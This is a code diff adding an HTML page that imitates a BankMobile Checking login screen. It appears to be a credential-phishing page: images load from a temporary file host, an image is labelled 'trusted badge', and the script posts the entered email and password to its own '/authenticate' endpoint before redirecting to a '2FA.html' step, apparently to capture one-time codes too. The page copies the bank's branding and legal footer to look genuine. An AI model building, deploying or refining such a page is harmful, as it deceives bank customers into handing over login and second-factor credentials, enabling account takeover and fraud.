@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome to BankMobile Checking.</title>
+<link rel="icon" type="image/x-icon" href="bmtx.ico">
+<link rel="shortcut icon" type="image/png" href="logo.png">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+        background: #fff;
+        color: #1a365d;
+        overflow-x: hidden;
+    }
+    
+    header {
+        background: #ffffff;
+        padding: 10px 50px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        height: 125px;
+        border-bottom: 1px solid #f0f0f0;
+        position: relative;
+        z-index: 10;
+    }
+    
+    .logo { color: #002d72; line-height: 0.95; }
+    .logo .bm { font-size: 34px; font-weight: 500; display: block; }
+    .logo .company { font-size: 32px; font-weight: 400; display: block; }
+    
+    .login-area { display: flex; align-items: flex-start; gap: 25px; padding-top: 15px; }
+    .login-fields { display: flex; gap: 50px; }
+    .field-group { display: flex; flex-direction: column; position: relative; }
+    .field-group label { font-size: 14px; font-weight: bold; color: #333; margin-bottom: 25px; }
+    
+   .field-group input {
+    border: none;
+    /* NO green underline */
+    padding: 8px 0;
+    width: 210px;
+    font-size: 16px;
+    outline: none;
+    background: transparent;
+    transition: box-shadow 0.2s ease;
+    border-radius: 4px;
+}
+.field-group input::placeholder { color: #bbb; font-style: italic; }
+/* NO hover effect - removed completely */
+/* ONLY blue box outline when clicked/focused */
+.field-group input:focus {
+    box-shadow: 0 0 0 3px rgba(173, 216, 230, 0.6), 0 0 0 1px #8fc9e8;
+    border-radius: 6px;
+    padding: 8px 10px;
+    margin: 0 -10px;
+    width: calc(100% + 20px);
+    background: transparent;
+}
+    
+    .error-note {
+        color: #d93025;
+        font-size: 11px;
+        margin-top: 4px;
+        display: none;
+        font-weight: bold;
+        position: absolute;
+        top: 65px;
+    }
+
+    .forgot-link-wrapper { text-align: right; width: 100%; }
+    .forgot-link { font-size: 11px; color: #002d72; text-decoration: underline; cursor: pointer; display: inline-block; margin-top: 8px; }
+    
+  .login-btn {
+    background: transparent;  /* No background color inside */
+    border: 2px solid #7ab3c8;  /* Light blue outline only */
+    color: #0a2f4d;  /* Darkish blue text */
+    font-weight: bold;
+    font-size: 16px;
+    padding: 8px 25px;
+    cursor: pointer;
+    height: 45px;
+    margin-top: 15px;
+    border-radius: 0px;  /* Normal rectangle - NO rounded corners */
+}
+.login-btn:hover {
+    background: rgba(122, 179, 200, 0.1);  /* Optional faint hover effect */
+    border-color: #5a9bb8;
+}
+    }
+    
+    .login-btn:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+    }
+    
+    .get-started-container { display: flex; flex-direction: column; margin-top: 10px; }
+    .get-started-container .small-text { font-size: 11px; color: #333; margin-bottom: 2px; }
+    .get-started-container a { font-size: 26px; color: #333; text-decoration: underline; }
+
+    .hero {
+        position: relative;
+        height: calc(100vh - 125px); 
+        background: #cfe6f7 url('https://pub.mini-tools.uk/30-day/e8f43f03-3a37-45c4-bca4-7534f848b303.jpg') no-repeat center/cover;
+        display: flex;
+        align-items: center;
+        padding-left: 22%; 
+        padding-right: 50px;
+    }
+
+    .hero-content { max-width: 600px; z-index: 2; }
+    
+    h1 { font-size: 62px; font-weight: 700; color: #002d72; line-height: 1.05; margin-bottom: 25px; }
+    .warning-text { font-size: 18px; line-height: 1.4; color: #002d72; margin-bottom: 35px; letter-spacing: -0.2px; }
+    .manage-label { font-size: 20px; font-weight: bold; color: #002d72; margin-bottom: 20px; }
+
+    .action-buttons { display: flex; gap: 8px; }
+    .action-btn {
+        background: #002d72;
+        color: white;
+        border: none;
+        padding: 22px 10px;
+        font-size: 16px;
+        border-radius: 4px;
+        cursor: pointer;
+        flex: 1;
+        text-align: center;
+        font-weight: 500;
+    }
+
+    .footer-separator { border-top: 1.5px solid #e0e0e0; width: 95%; margin: 80px auto 30px auto; }
+    footer { text-align: center; padding: 0 20px 80px 20px; color: #000; background: #fff; }
+    .footer-nav { font-size: 11px; margin-bottom: 25px; font-weight: bold; }
+    .footer-nav a { color: #000; text-decoration: underline; margin: 0 5px; }
+    .partner-logos { margin-bottom: 30px; }
+    .partner-logos img { height: 40px; }
+    .legal-footer { max-width: 950px; margin: 0 auto; font-size: 10.5px; line-height: 1.6; color: #333; }
+
+    /* ============================================ */
+    /* FULL PAGE LOADING OVERLAY - NO WHITE CARD */
+    /* ============================================ */
+    .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.65);
+        backdrop-filter: blur(4px);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        animation: fadeIn 0.25s ease;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+    
+    /* Simple spinner - no white card */
+    .simple-spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top-color: #2e9e4a;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    
+    /* Loading text with dots */
+    .loading-text {
+        color: white;
+        font-size: 18px;
+        font-weight: 500;
+        margin-top: 20px;
+        letter-spacing: 0.5px;
+    }
+    
+    .loading-dots {
+        display: inline-flex;
+        align-items: center;
+        gap: 3px;
+    }
+    
+    .loading-dots span {
+        width: 6px;
+        height: 6px;
+        background-color: #2e9e4a;
+        border-radius: 50%;
+        display: inline-block;
+        animation: dotPulse 1.4s infinite ease-in-out both;
+    }
+    
+    .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+    .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+    
+    @keyframes dotPulse {
+        0%, 80%, 100% {
+            transform: scale(0.8);
+            opacity: 0.4;
+        }
+        40% {
+            transform: scale(1.2);
+            opacity: 1;
+        }
+    }
+    
+    /* Center container for spinner and text */
+    .loading-center {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+</style>
+</head>
+<body>
+
+    <!-- FULL PAGE LOADING OVERLAY - DARK WITH SPINNER ONLY -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-center">
+            <div class="simple-spinner"></div>
+            <div class="loading-text">
+                Verifying<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>
+            </div>
+        </div>
+    </div>
+
+    <header>
+       <div class="logo">
+    <div style="display: inline-block; margin-left: 15px;">
+        <img src="https://pub.mini-tools.uk/30-day/bb1d8f19-7b69-43aa-b963-a71a4cc2dfaf.png" 
+             alt="trusted badge" style="height: 70px; width: auto;">
+    </div>
+</div>
+        
+        <div class="login-area">
+            <div class="login-fields">
+                <div class="field-group">
+                    <label>Email Address:</label>
+                    <input type="email" id="email" placeholder="Ex: janedoe@yahoo.com">
+                    <div id="email-error" class="error-note">Enter a valid email address.</div>
+                </div>
+                
+                <div class="field-group">
+                    <label>Password:</label>
+                    <input type="password" id="password" placeholder="(case sensitive)">
+                    <div id="pass-error" class="error-note">Password is required.</div>
+                    <div class="forgot-link-wrapper">
+                        <span class="forgot-link">Forgot Login Information?</span>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="login-btn" id="loginBtn" onclick="login()">LOG IN!</button>
+            
+            <div class="get-started-container">
+                <span class="small-text">Haven't made a choice?</span>
+                <a href="#">Get Started</a>
+            </div>
+        </div>
+    </header>
+<main class="hero">
+    <div class="hero-content">
+        <!-- The background image is handled entirely by your CSS class below -->
+    </div>
+</main>
+
+    <div class="footer-separator"></div>
+
+    <footer>
+        <div class="footer-nav">
+            <a href="#">Home</a> | <a href="#">Security</a> | <a href="#">Fee Schedules</a> | <a href="#">Terms and Conditions</a> | <a href="#">Privacy Statement</a> | <a href="#">Privacy Notice for California Residents</a> | <a href="#">Contact Us</a> | <a href="#">Identity Verification</a> | <a href="#">FAQs</a>
+        </div>
+        <div class="partner-logos">
+             <img src="https://pub.mini-tools.uk/30-day/db986403-4750-45d2-a56b-c211625ed653.png" alt="First Carolina Bank | BM Technologies">
+        </div>
+        <div class="legal-footer">
+            <p><strong>© 2026 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.</strong></p>
+            <br>
+            <p>BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC & Equal Housing Lender. The BankMobile Debit Mastercard® card is issued and administered by First Carolina Bank pursuant to license from Mastercard International Incorporated. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.</p>
+            <br>
+            <p><strong>BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804</strong></p>
+        </div>
+    </footer>
+
+    <script>
+        // Get DOM elements
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const emailEl = document.getElementById('email');
+        const passEl = document.getElementById('password');
+        const emailErr = document.getElementById('email-error');
+        const passErr = document.getElementById('pass-error');
+        
+        // ============================================
+        // FIX: Clear loading state when page loads
+        // This prevents the loading screen from appearing
+        // when user presses the back button
+        // ============================================
+        function resetPageState() {
+            // Hide loading overlay if it's visible
+            loadingOverlay.style.display = 'none';
+            // Re-enable the login button
+            loginBtn.disabled = false;
+            // Clear any error messages
+            emailErr.style.display = 'none';
+            passErr.style.display = 'none';
+            // Clear password field for security (optional)
+            // passEl.value = '';
+        }
+        
+        // Run reset when page loads
+        resetPageState();
+        
+        // Also run when page is restored from bfcache (back/forward cache)
+        window.addEventListener('pageshow', function(event) {
+            // If the page was loaded from cache (back button)
+            if (event.persisted) {
+                resetPageState();
+            }
+        });
+        
+        // Function to show loading overlay (darkens the page)
+        function showLoading() {
+            loadingOverlay.style.display = 'flex';
+            loginBtn.disabled = true;
+        }
+        
+        // Function to hide loading overlay
+        function hideLoading() {
+            loadingOverlay.style.display = 'none';
+            loginBtn.disabled = false;
+        }
+        
+        async function login() {
+            // Reset any previous errors
+            emailErr.style.display = 'none';
+            passErr.style.display = 'none';
+
+            const email = emailEl.value.trim();
+            const password = passEl.value.trim();
+            
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            let isValid = true;
+
+            if (!emailPattern.test(email)) {
+                emailErr.style.display = 'block';
+                isValid = false;
+            }
+
+            if (!password) {
+                passErr.style.display = 'block';
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            // Show dark overlay with spinner in the middle
+            showLoading();
+
+            try {
+                // Send to backend for authentication
+                const response = await fetch('/authenticate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const data = await response.json();
+
+                // Redirect based on backend response
+                if (data.success) {
+                    window.location.href = '2FA.html';
+                } else {
+                    window.location.href = 'error_verify.html';
+                }
+
+            } catch (e) {
+                // If server fails, hide loading and show error
+                hideLoading();
+                console.error('Login error:', e);
+                emailErr.style.display = 'block';
+                emailErr.textContent = 'Connection error. Please try again.';
+                setTimeout(() => {
+                    emailErr.style.display = 'none';
+                    emailErr.textContent = 'Enter a valid email address.';
+                }, 3000);
+            }
+        }
+        
+        // Allow Enter key to submit
+        function handleEnter(e) {
+            if (e.key === 'Enter') {
+                login();
+            }
+        }
+        
+        emailEl.addEventListener('keypress', handleEnter);
+        passEl.addEventListener('keypress', handleEnter);
+        
+        // Clear error styling when user starts typing
+        emailEl.addEventListener('input', () => {
+            emailErr.style.display = 'none';
+        });
+        
+        passEl.addEventListener('input', () => {
+            passErr.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
